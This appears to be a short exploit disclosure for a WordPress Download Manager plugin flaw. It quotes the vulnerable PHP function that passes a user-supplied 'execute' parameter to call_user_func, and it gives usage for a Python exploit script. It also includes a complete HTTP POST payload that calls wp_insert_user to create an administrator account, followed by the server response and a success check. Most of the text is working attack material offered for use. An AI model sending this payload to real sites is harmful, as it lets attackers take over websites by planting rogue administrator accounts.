Des:
- Vuln at path "/download-manager/wpdm-core.php"
- Function :function wpdm_ajax_call_exec()
 {
    if (isset($_POST['action']) && $_POST['action'] == 'wpdm_ajax_call') {
         if (function_exists($_POST['execute']))
             call_user_func($_POST['execute'], $_POST);
         else
             echo "function not defined!";
         die();
     }
 }


Exploit:

Usage: python exploit.py -t URL [--timeout sec]

Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert TARGET URL: http[s]://www.victim.com[:PORT]
  --timeout=TIMEOUT     [Timeout Value] - Default 10


Burpsuite Request:

POST /wordpress/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 98
Connection: close

action=wpdm_ajax_call&execute=wp_insert_user&user_login=admin2&user_pass=123456&role=administrator



=> RESPONSE

HTTP/1.1 200 OK
Date: Fri, 31 Aug 2018 02:05:00 GMT
Server: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.5.35
X-Powered-By: PHP/5.5.35
Set-Cookie: PHPSESSID=dhh9ejthfctduo454211mg0r37; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
X-Pingback: http://127.0.0.1/wordpress/xmlrpc.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8



Response null = exploit done, other is exploit fail.